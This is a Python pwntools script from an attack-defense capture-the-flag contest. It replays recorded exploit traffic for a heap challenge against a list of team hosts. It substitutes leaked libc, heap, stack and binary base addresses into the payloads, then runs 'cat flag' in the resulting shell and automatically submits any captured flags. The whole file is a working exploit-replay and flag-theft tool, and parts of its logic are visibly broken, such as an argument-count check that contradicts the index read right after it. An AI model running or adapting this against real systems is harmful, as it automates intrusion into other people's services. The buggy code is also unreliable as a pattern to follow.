import os,re,sys
os.environ['PWNLIB_NOTERM']='1'
from pwn import *
import shutil
import json

ERROR_VALUE = 0x94ac411122323232332
context(log_level='DEBUG')
SLEEP_TIME = 0.1

from flag_util import teams
from flag_util import submit_flag

def get_data_value_by_type(value,value_type,length):
    if value_type == 'DEC':
        return str(value)
    if value_type == 'HEX':
        return hex(value)[2:]
    if value_type == '0XHEX':
        return hex(value)
    if value_type == 'ORI':
        return p64(value)[:length]

def get_num_value_by_type(value,value_type,length):
    if value_type == 'DEC':
        return int(value)
    if value_type == 'HEX':
        return int(value,16)
    if value_type == '0XHEX':
        return int(value, 16)
    if value_type == 'ORI':
        if length == 3:
            return u32(value+'\x00')
        if length == 4:
            return u32(value)
        if length == 5:
            return u32(value+'\x00'*3)
        if length == 6:
            return u64(value+'\x00\x00')
        if length == 7:
            return u64(value + '\x00')
        if length == 8:
            return u64(value)


def record_to_value(buffer,libc_base,elf_base,heap_base,stack_base):
    res = buffer.split(':')
    record_type = res[0]
    record_offset = int(res[1])
    record_length = int(res[2])
    record_value_type = res[3]
    if record_type.find('LIBC_BASE') != -1:
        if libc_base==0:
            return ERROR_VALUE
        value = libc_base + record_offset
        buffer = buffer.replace(buffer,get_data_value_by_type(value,record_value_type,record_length) )

    elif record_type.find('ELF_BASE') != -1:
        if elf_base == 0:
            return ERROR_VALUE
        value = elf_base + record_offset
        buffer = buffer.replace(buffer, get_data_value_by_type(value, record_value_type, record_length))

    elif record_type.find('STACK_BASE') != -1:
        if stack_base == 0:
            return ERROR_VALUE
        value = stack_base + record_offset
        buffer = buffer.replace(buffer, get_data_value_by_type(value, record_value_type, record_length))

    elif record_type.find('HEAP_BASE') != -1:
        if heap_base == 0:
            return ERROR_VALUE
        value = heap_base + record_offset
        buffer = buffer.replace(buffer, get_data_value_by_type(value, record_value_type, record_length))
    return buffer


def get_record_length(buffer):
    res = buffer.split(':')
    record_type = res[0]
    record_offset = int(res[1])
    record_length = int(res[2])
    record_value_type = res[3]
    return record_length


def get_record_value_type(buffer):
    res = buffer.split(':')
    record_type = res[0]
    record_offset = int(res[1])
    record_length = int(res[2])
    record_value_type = res[3]
    return record_value_type


def get_record_position(buffer):
    res = buffer.split(':')
    record_type = res[0]
    record_offset = int(res[1])
    record_length = int(res[2])
    record_value_type = res[3]
    record_position = int(res[4])
    return record_position

def get_record_type(buffer):
    res = buffer.split(':')
    record_type = res[0]
    record_offset = int(res[1])
    record_length = int(res[2])
    record_value_type = res[3]
    record_position = int(res[4])
    return record_type


def get_record_offset(buffer):
    res = buffer.split(':')
    record_type = res[0]
    record_offset = int(res[1])
    record_length = int(res[2])
    record_value_type = res[3]
    record_position = int(res[4])
    return record_offset


ip_list = ['127.0.0.1']
port = 20002


def send_one_file(file_name,ip,port):
    con = remote(ip,port)
    continue_process_flag = True
    libc_base = 0
    heap_base = 0
    elf_base = 0
    stack_base = 0

    pfile = open(file_name, 'r')
    json_datas = json.load(pfile)
    pfile.close()
    print 'process file: ' + file_name
    for tracfic_info in json_datas:
        if not continue_process_flag:
            break
        type = int(tracfic_info[0])
        value = tracfic_info[1:].decode('string-escape')
        if type == 0:
            if value.find('{{{') == -1:
                con.write(value)
                continue
            else:
                results = re.findall('\{\{\{(.+?)\}\}\}', value)
                for result in results:
                    result_value = record_to_value(result, libc_base, elf_base, heap_base, stack_base)
                    if result_value == ERROR_VALUE:
                        print 'Error, unable to convert record to Value: ' + result
                        continue_process_flag = False
                        break
                    value = value.replace('{{{' + result + '}}}', result_value)
                con.write(value)

        elif type == 1 or type == 2:
            if value.find('{{{') == -1:
                sleep(SLEEP_TIME)
                data = con.recv(len(value),timeout=10)
                if data != value:
                    print 'not same: '
                    print data
                    print value
                continue
            else:
                results = re.findall('\{\{\{(.+?)\}\}\}', value)
                value_copy = value
                for result in results:
                    value_copy = value_copy.replace("{{{"+result+"}}}", 'A' * get_record_length(result))
                total_length = len(value_copy)
                sleep(SLEEP_TIME)
                data = con.recv(total_length,timeout=10)
                for result in results:
                    process_data = data[
                                   get_record_position(result):get_record_position(result) + get_record_length(result)]
                    record_type = get_record_type(result)
                    if record_type == 'LIBC_BASE':
                        libc_base = get_num_value_by_type(process_data, get_record_value_type(result),
                                                          get_record_length(result)) - get_record_offset(result)
                        print "libc_base: " + hex(libc_base)
                    elif record_type == 'ELF_BASE':
                        elf_base = get_num_value_by_type(process_data, get_record_value_type(result),
                                                         get_record_length(result)) - get_record_offset(result)
                        print "elf_base: " + hex(elf_base)
                    elif record_type == 'STACK_BASE':
                        stack_base = get_num_value_by_type(process_data, get_record_value_type(result),
                                                           get_record_length(result)) - get_record_offset(result)
                        print "stack_base: " + hex(stack_base)
                    elif record_type == 'HEAP_BASE':
                        heap_base = get_num_value_by_type(process_data, get_record_value_type(result),
                                                          get_record_length(result)) - get_record_offset(result)
                        print "heap_base: " + hex(heap_base)
                    else:
                        print 'ERROR! unknown record type'
        sleep(SLEEP_TIME)
    con.interactive()
    con.send('cat flag')
    data = con.recv(timeout=2)
    flag = re.findall('(hwctf\{\w+\})', data)
    if len(flag) != 0:
        print 'remote verify ' + ip + ' succeed: ' + file_name
    else:
        print 'remote verify ' + ip + ' failed: ' + file_name


def usage():
    for i in range(0,len(sys.argv)):
        print "sys.argv["+str(i)+"]: " + sys.argv[i]
    print "usage: 1. " +sys.argv[0] + " one_file file_name "
    print "       2. " +sys.argv[0] + " local workspace"
    exit(-1)



if __name__ == "__main__":
    ip_list = teams
    if len(sys.argv) < 2:
        usage()
    if sys.argv[1] == 'one_file':
        if len(sys.argv) != 2:
            usage()
        if not os.path.exists(sys.argv[2]):
            print "File not exist: " + sys.argv[2]
            usage()
        for ip in ip_list:
            try:
                send_one_file(sys.argv[2],ip,port)
            except Exception as e:
                print e.message
    elif sys.argv[1] != "local":
        usage()
    LOG_FORMAT = "%(asctime)s - %(levelname)s - %(message)s"
    logging.basicConfig(stream=sys.stdout, level=logging.DEBUG, format=LOG_FORMAT)
    workspace =  sys.argv[2]
    scan_dir = workspace + '/local_verify_success/'
    verify_success_dir = workspace + '/remote_verify_success/'
    verify_failed_dir = workspace + '/remote_verify_failed/'
    if not os.path.exists(scan_dir):
        print "local workspace must start analysis server first"
        usage()
    if not os.path.exists(verify_success_dir):
        logging.info( 'create remote verify success dir: ' + scan_dir)
        os.mkdir(verify_success_dir)
    if not os.path.exists(verify_failed_dir):
        logging.info( 'create remote verify failed dir: ' + scan_dir)
        os.mkdir(verify_failed_dir)

    while True:
        logging.debug( 'scan dir......................')
        for file_name in os.listdir(scan_dir):
            success_flag = False
            if file_name.find('.')!=-1:
                continue
            for ip in ip_list:
                try:
                    continue_process_flag = True
                    libc_base = 0
                    heap_base = 0
                    elf_base = 0
                    stack_base = 0
                    #con = remote(ip,port)
                    con = process('./babyheap',env={"LD_PRELOAD": './libc.so'})
                    pfile = open(os.path.join(scan_dir,file_name),'r')
                    json_datas = json.load(pfile)
                    pfile.close()
                    logging.info( 'process file: ' + file_name)
                    for tracfic_info in json_datas:
                        if not continue_process_flag:
                            break
                        type = int(tracfic_info[0])
                        value = tracfic_info[1:].decode('string-escape')
                        if type == 0:
                            if value.find('{{{')== -1:
                                con.write(value)
                                continue
                            else:
                                results = re.findall('\{\{\{(.+?)\}\}\}', value)
                                for result in results:
                                    result_value = record_to_value(result,libc_base,elf_base,heap_base,stack_base)
                                    if result_value == ERROR_VALUE:
                                        logging.error( 'Error, unable to convert record to Value: ' + result)
                                        continue_process_flag = False
                                        break
                                    value = value.replace('{{{'+result+'}}}',result_value)
                                con.write(value)

                        elif type == 1 or type == 2:
                            if value.find('{{{')== -1:
                                sleep(SLEEP_TIME)
                                con.recv(len(value),timeout=10)
                                continue
                            else:
                                results = re.findall('\{\{\{(.+?)\}\}\}', value)
                                value_copy = value
                                for result in results:
                                    value_copy = value_copy.replace("{{{"+result+"}}}", 'A' * get_record_length(result))
                                total_length = len(value_copy)
                                sleep(SLEEP_TIME)
                                data = con.recv(total_length,timeout=10)
                                for result in results:
                                    process_data = data[get_record_position(result):get_record_position(result)+get_record_length(result)]
                                    record_type = get_record_type(result)
                                    if record_type == 'LIBC_BASE':
                                        libc_base = get_num_value_by_type(process_data,get_record_value_type(result),get_record_length(result)) - get_record_offset(result)
                                    elif record_type == 'ELF_BASE':
                                        elf_base = get_num_value_by_type(process_data, get_record_value_type(result),
                                                                         get_record_length(result)) - get_record_offset(result)
                                    elif record_type == 'STACK_BASE':
                                        stack_base = get_num_value_by_type(process_data, get_record_value_type(result),
                                                                           get_record_length(result)) - get_record_offset(result)
                                    elif record_type == 'HEAP_BASE':
                                        heap_base = get_num_value_by_type(process_data, get_record_value_type(result),
                                                                          get_record_length(result)) - get_record_offset(result)
                                    else:
                                        logging.error('ERROR! unknown record type')
                    con.sendline('cat /tmp/flag')
                    data = con.recv(timeout=2)
                    print data
                    flag = re.findall('(hwctf\{\w+\})',data)
                    if len(flag)!=0:
                        flag = flag[0]
                        success_flag = True
                        submit_flag(ip,flag)
                    con.close()

                except Exception as e:
                    logging.info(e.message)
                    con.close()

            if success_flag:
                shutil.move(os.path.join(scan_dir,file_name),os.path.join(verify_success_dir,file_name))
                logging.info( "flag: "+flag)
                logging.info('remote verify ' + ip + ' succeed: ' + file_name)
            else:
                shutil.move(os.path.join(scan_dir,file_name),os.path.join(verify_failed_dir,file_name))
                logging.info( 'remote verify ' + ip + ' failed: ' + file_name)
        sleep(10)
